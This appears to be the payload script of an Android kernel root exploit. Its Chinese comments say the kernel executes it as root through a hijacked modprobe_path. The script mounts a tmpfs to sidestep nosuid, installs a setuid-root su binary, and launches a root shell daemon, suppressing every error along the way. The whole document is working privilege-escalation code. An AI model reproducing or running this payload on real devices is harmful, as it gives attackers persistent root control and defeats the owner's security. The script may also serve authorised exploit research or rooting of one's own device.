#!/system/bin/sh
# 由内核以 root 执行（modprobe_path 劫持）。
# 内核传入的 argv：<modprobe_path> -q -- net-pf-30
#
# 1) 挂一个 tmpfs 给 su（/data 是 nosuid，4755 只在 tmpfs 上有效）
# 2) 把 setuid su 装进去
# 3) 启动 root shell 守护进程

D=/data/local/tmp
/system/bin/date > $D/.payload_ran 2>/dev/null

mkdir -p "$D/.su" 2>/dev/null

/system/bin/mount -t tmpfs -o mode=0755 tmpfs "$D/.su" 2>/dev/null
/system/bin/cp -f "$D/.su.bin" "$D/.su/su" 2>/dev/null
/system/bin/chmod 4755 "$D/.su/su" 2>/dev/null

"$D/rootshell" -d
